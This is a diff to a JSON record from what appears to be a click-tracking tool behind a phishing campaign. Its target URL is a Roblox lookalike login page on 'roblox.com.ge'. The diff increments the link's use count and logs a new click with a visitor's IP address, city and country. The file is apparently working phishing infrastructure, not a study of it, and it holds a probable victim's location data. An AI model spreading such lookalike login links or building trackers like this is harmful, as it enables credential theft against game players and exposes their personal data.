@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1211,
+    "useCount": 1212,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9827,6 +9827,14 @@
       },
       {
         "timestamp": 1777312413462,
+        "ip": "62.231.94.247",
+        "country": "Romania",
+        "city": "Râmnicu Vâlcea",
+        "flag": "🇷🇴",
+        "countryCode": "RO"
+      },
+      {
+        "timestamp": 1777312422642,
         "ip": "62.231.94.247",
         "country": "Romania",
         "city": "Râmnicu Vâlcea",
